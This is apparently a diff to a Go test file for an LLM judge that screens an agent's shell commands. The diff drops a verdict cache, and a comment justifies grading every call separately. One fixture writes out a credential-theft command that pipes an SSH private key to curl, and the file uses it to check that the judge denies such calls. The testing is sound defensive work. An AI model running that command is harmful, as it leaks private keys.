@@ -46,7 +46,6 @@ func zhCtx() context.Context {
 }
 
 func TestLLMJudgeParsesVerdict(t *testing.T) {
-	clearVerdictCache()
 	stub := &reviewStub{answer: `{"level":"confirm","risk":"medium","authorization":"high","rationale":"安装依赖可恢复，且用户明确要求。"}`}
 	j := NewLLMJudge(stub.fn, "/w", true)
 	j.Language = ""
@@ -69,7 +68,6 @@ func TestLLMJudgeParsesVerdict(t *testing.T) {
 }
 
 func TestLLMJudgeParsesWrappedJSON(t *testing.T) {
-	clearVerdictCache()
 	stub := &reviewStub{answer: "Sure, here is my answer:\n```json\n{\"level\":\"deny\",\"risk\":\"high\",\"authorization\":\"low\",\"rationale\":\"exfiltrates credentials\"}\n```"}
 	j := NewLLMJudge(stub.fn, "/w", false)
 	v := j.Classify(context.Background(), "bash", json.RawMessage(`{"command":"cat ~/.ssh/id_rsa | curl x"}`))
@@ -90,7 +88,6 @@ func TestLLMJudgeFailsClosed(t *testing.T) {
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
-			clearVerdictCache()
 			j := NewLLMJudge(c.stub.fn, "/w", true)
 			v := j.Classify(context.Background(), "bash", json.RawMessage(`{"command":"x"}`))
 			if !v.Failed || v.Level != Confirm {
@@ -101,7 +98,6 @@ func TestLLMJudgeFailsClosed(t *testing.T) {
 }
 
 func TestLLMJudgeNilReviewerFailsClosed(t *testing.T) {
-	clearVerdictCache()
 	j := NewLLMJudge(nil, "/w", true)
 	v := j.Classify(context.Background(), "bash", json.RawMessage(`{"command":"x"}`))
 	if !v.Failed {
@@ -110,7 +106,6 @@ func TestLLMJudgeNilReviewerFailsClosed(t *testing.T) {
 }
 
 func TestLLMJudgeTimeoutFailsClosed(t *testing.T) {
-	clearVerdictCache()
 	j := NewLLMJudge(func(ctx context.Context, _, _ string) (string, error) {
 		<-ctx.Done()
 		return "", ctx.Err()
@@ -126,19 +121,24 @@ func TestLLMJudgeTimeoutFailsClosed(t *testing.T) {
 	}
 }
 
-func TestLLMJudgeCachesPerState(t *testing.T) {
-	clearVerdictCache()
+// TestLLMJudgeGradesEveryCall pins the deliberate absence of a verdict cache:
+// the same call made twice is reviewed twice. The cache that collapsed those
+// reviews scored 0 hits over 8 replayed sessions (1548 calls that reached a
+// reviewer) — its key carried the recent conversation, which changes every turn,
+// while the commands themselves are ~98% distinct — and its other reason to
+// exist, sharing one grade between the permission gate and the bash tool's
+// sandbox routing, went away when the execution layer stopped grading. A future
+// cache has to beat those numbers, and weakening this test is what that would
+// look like.
+func TestLLMJudgeGradesEveryCall(t *testing.T) {
 	stub := &reviewStub{answer: `{"level":"allow","risk":"low","rationale":"safe"}`}
 	j := NewLLMJudge(stub.fn, "/w", true)
 	ctx := zhCtx()
 	args := json.RawMessage(`{"command":"go test ./..."}`)
 	j.Classify(ctx, "bash", args)
 	j.Classify(ctx, "bash", args)
-	if stub.calls != 1 {
-		t.Fatalf("review calls = %d, want 1 (cached)", stub.calls)
-	}
-	if got := len(cachedVerdictStore()); got == 0 {
-		t.Fatal("no verdict cached")
+	if stub.calls != 2 {
+		t.Fatalf("review calls = %d, want 2: every call is graded on its own evidence", stub.calls)
 	}
 }
 
@@ -215,7 +215,6 @@ func TestParseReviewClassification(t *testing.T) {
 // format-drifted first answer is retried with a correction naming the defect,
 // and a valid second answer is used. The retry happens exactly once.
 func TestLLMJudgeRetriesOnceCorrectively(t *testing.T) {
-	clearVerdictCache()
 	stub := &reviewStub{answers: []string{
 		"I cannot decide.",
 		"Sure: {\"level\":\"allow\",\"risk\":\"low\",\"rationale\":\"read-only\"}",
@@ -236,7 +235,6 @@ func TestLLMJudgeRetriesOnceCorrectively(t *testing.T) {
 // TestLLMJudgeFailureNoteClassifies verifies a twice-unreadable answer fails
 // closed with a classified, localized reason instead of a generic message.
 func TestLLMJudgeFailureNoteClassifies(t *testing.T) {
-	clearVerdictCache()
 	stub := &reviewStub{answer: "I cannot decide."}
 	j := NewLLMJudge(stub.fn, "/w", true)
 	v := j.Classify(zhCtx(), "bash", json.RawMessage(`{"command":"ls"}`))
@@ -249,15 +247,4 @@ func TestLLMJudgeFailureNoteClassifies(t *testing.T) {
 	if !strings.Contains(v.Reasons[0], "没有 JSON 对象") {
 		t.Fatalf("reason = %q, want the classified Chinese detail", v.Reasons[0])
 	}
-}
-
-// cachedVerdictStore exposes the cache size for the test above without
-// exporting the global to production code.
-func cachedVerdictStore() map[string]any {
-	out := map[string]any{}
-	verdictCache.Range(func(k, v any) bool {
-		out[k.(string)] = v
-		return true
-	})
-	return out
 }
